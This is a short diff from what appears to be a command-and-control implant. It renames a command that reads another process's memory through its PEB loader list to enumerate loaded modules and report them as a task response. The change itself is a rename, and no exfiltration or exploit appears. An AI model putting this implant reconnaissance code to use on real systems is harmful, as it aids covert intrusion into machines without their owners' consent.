@@ -95,10 +95,10 @@ namespace Commands {
         }
     }
 
-    VOID ProcessMods (PARSER *parser) {
+    VOID ProcessModules (PARSER *parser) {
         HEXANE;
 
-        STREAM *out = CreateTaskResponse(PROCESSMODULE);
+        STREAM *out = CreateTaskResponse(PROCESSMODULES);
 
         LDR_DATA_TABLE_ENTRY mod = { };
         PROCESS_BASIC_INFORMATION pbi = { };
@@ -120,9 +120,9 @@ namespace Commands {
 
         x_ntassert(ctx->win32.NtQueryInformationProcess(process, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), nullptr));
         x_ntassert(ctx->win32.NtReadVirtualMemory(process, &pbi.PebBaseAddress->Ldr, &loads, sizeof(PLDR_DATA_TABLE_ENTRY), &size));
-        x_ntassert(ctx->win32.NtReadVirtualMemory(process, &loads->InMemoryOrderModList.Flink, &entry, sizeof(PLIST_ENTRY), nullptr));
+        x_ntassert(ctx->win32.NtReadVirtualMemory(process, &loads->InMemoryOrderModuleList.Flink, &entry, sizeof(PLIST_ENTRY), nullptr));
 
-        for (head = &loads->InMemoryOrderModList; entry != head; entry = mod.InMemoryOrderLinks.Flink) {
+        for (head = &loads->InMemoryOrderModuleList; entry != head; entry = mod.InMemoryOrderLinks.Flink) {
             x_ntassert(ctx->win32.NtReadVirtualMemory(process, CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks), &mod, sizeof(LDR_DATA_TABLE_ENTRY), nullptr));
             x_ntassert(ctx->win32.NtReadVirtualMemory(process, mod.FullDllName.Buffer, &modname_w, mod.FullDllName.Length, &size));
             x_assert(size == mod.FullDllName.Length);
